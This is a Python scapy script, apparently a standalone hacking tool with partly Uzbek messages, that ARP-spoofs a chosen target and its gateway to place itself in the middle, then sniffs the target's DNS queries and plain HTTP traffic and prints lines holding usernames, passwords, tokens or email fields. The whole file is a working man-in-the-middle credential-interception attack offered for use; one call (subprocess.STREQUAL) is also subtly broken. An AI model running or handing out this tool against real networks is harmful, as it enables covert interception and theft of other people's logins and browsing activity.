#!/usr/bin/env python3
import os
import sys
import time
import logging

logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import ARP, send, sniff, Raw, IP, DNS, DNSQR, get_if_list

Reset        = "\033[0m"
Bold         = "\033[1m"
Underline    = "\033[4m"
CrimsonRed   = "\033[38;5;196m"  
BloodWine    = "\033[38;5;124m"  
ElectricV    = "\033[38;5;129m"  
BrightJade   = "\033[38;5;49m"   
NeonOrange   = "\033[38;5;208m"  
GoldYellow   = "\033[38;5;220m"  
GhostGray    = "\033[38;5;244m"  
CyberWhite   = "\033[38;5;255m"  

def get_live_interface():
    interfaces = get_if_list()
    for iface in interfaces:
        if iface.startswith("wlan") or iface.startswith("eth") or iface.startswith("en"):
            return iface
    return "eth0"

def get_mac(ip):
    try:
        from scapy.all import Ether, ARP, srp
        iface = get_live_interface()
        arp_request = ARP(pdst=ip)
        broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
        arp_request_broadcast = broadcast / arp_request
        
        answered, _ = srp(arp_request_broadcast, timeout=3, retry=3, iface=iface, verbose=False)
        if len(answered) > 0:
            for snd, rcv in answered:
                return rcv.hwsrc
                
        import subprocess
        import re
        arp_output = subprocess.check_output(["arp", "-n", ip], stderr=subprocess.STREQUAL).decode("utf-8")
        mac_find = re.search(r"(([a-fA-F0-9]{2}:){5}[a-fA-F0-9]{2})", arp_output)
        if mac_find:
            return mac_find.group(0)
        return None
    except Exception:
        return None

def spoof(target_ip, spoof_ip, target_mac):
    packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    send(packet, verbose=False)

def restore(destination_ip, source_ip, dest_mac, source_mac):
    packet = ARP(op=2, pdst=destination_ip, hwdst=dest_mac, psrc=source_ip, hwsrc=source_mac)
    send(packet, count=4, verbose=False)

grouped_domains = {}

def get_root_domain(domain):
    parts = domain.split('.')
    if len(parts) >= 2:
        if len(parts) >= 3 and parts[-2] in ["com", "co", "org", "net", "gov", "edu", "ac"]:
            return ".".join(parts[-3:])
        return ".".join(parts[-2:])
    return domain

def process_sniffed_packet(packet):
    global grouped_domains
    if packet.haslayer(DNS) and packet.getlayer(DNS).qr == 0:
        try:
            full_domain = packet[DNSQR].qname.decode('utf-8').strip(".").lower()
            if any(x in full_domain for x in ["connectivity", "clients3", "gstatic", "googleusercontent", "telemetry"]):
                return
                
            root_domain = get_root_domain(full_domain)
            current_time = time.strftime("%H:%M:%S")
            
            if root_domain not in grouped_domains:
                grouped_domains[root_domain] = []
                print(f"\n\r\033[K{GhostGray}[{current_time}]{Reset} {BrightJade}{Bold}⚡ ACCESS GRANTED ───> {Underline}{root_domain.upper()}{Reset}")
            
            if full_domain != root_domain and full_domain not in grouped_domains[root_domain]:
                grouped_domains[root_domain].append(full_domain)
                print(f"\r\033[K{BloodWine}  ├── {Reset}{NeonOrange}{full_domain}{Reset}")
        except Exception:
            pass

    if packet.haslayer(Raw):
        try:
            load = packet[Raw].load.decode('utf-8', errors='ignore')
            if "POST" in load or any(k in load.lower() for k in ["login=", "password=", "passwd=", "pword="]):
                print(f"\n{CrimsonRed}[███████████████ DATA INTERCEPTED (CRIMSON REACTION) ███████████████]{Reset}")
                print(f"{GoldYellow}┌────────────────────────────────────────────────────────────────────────┐{Reset}")
                lines = load.splitlines()
                for line in lines:
                    if any(keyword in line.lower() for keyword in ["user", "pass", "log", "auth", "token", "mail"]):
                        if len(line) < 300:
                            print(f"{CrimsonRed}│ {Reset}{CyberWhite}{line.strip()}{Reset}")
                print(f"{GoldYellow}└────────────────────────────────────────────────────────────────────────┘{Reset}\n")
        except Exception:
            pass

def main():
    try:
        target_ip = input().strip()
        gateway_ip = input().strip()
    except Exception:
        print(f"{CrimsonRed}[!] XATOLIK: IP manzillarni qabul qilib bo'lmadi.{Reset}")
        sys.exit(1)

    print(f"{GoldYellow}[*] Injecting malicious ARP responses into the cache...{Reset}")
    
    target_mac = get_mac(target_ip)
    gateway_mac = get_mac(gateway_ip)

    if not target_mac or not gateway_mac:
        print(f"{CrimsonRed}[XATO] MAC manzillarni aniqlab bo'lmadi! Tarmoq liniyasini tekshiring.{Reset}")
        return

    print(f"\n{BrightJade}[+] TARGET LOCK: {target_ip} ({target_mac}){Reset}")
    print(f"{ElectricV}[*] INJECTION REACTION: LIVE SNIFFING RUNNING...{Reset}")
    print(f"{GhostGray}[*] To'xtatish uchun Ctrl+C bosing.{Reset}\n")

    packets_sent = 0
    try:
        while True:
            spoof(target_ip, gateway_ip, target_mac)
            spoof(gateway_ip, target_ip, gateway_mac)
            packets_sent += 2
            
            print(f"\r{GhostGray}[{packets_sent} raw packets injected] 💀 Sniffer: {CrimsonRed}ACTIVE{Reset}", end="", flush=True)
            sniff(filter=f"ip host {target_ip} and (udp port 53 or tcp port 80)", prn=process_sniffed_packet, store=False, timeout=1)
            time.sleep(1)
            
    except KeyboardInterrupt:
        print(f"\n\n{GoldYellow}[*] Stopping operation! Restoring network cache...{Reset}")
        restore(target_ip, gateway_ip, target_mac, gateway_mac)
        restore(gateway_ip, target_ip, gateway_mac, target_mac)
        print(f"{BrightJade}[+] Tarmoq kesh xotirasi muvaffaqiyatli tiklandi.{Reset}")

if __name__ == "__main__":
    main()
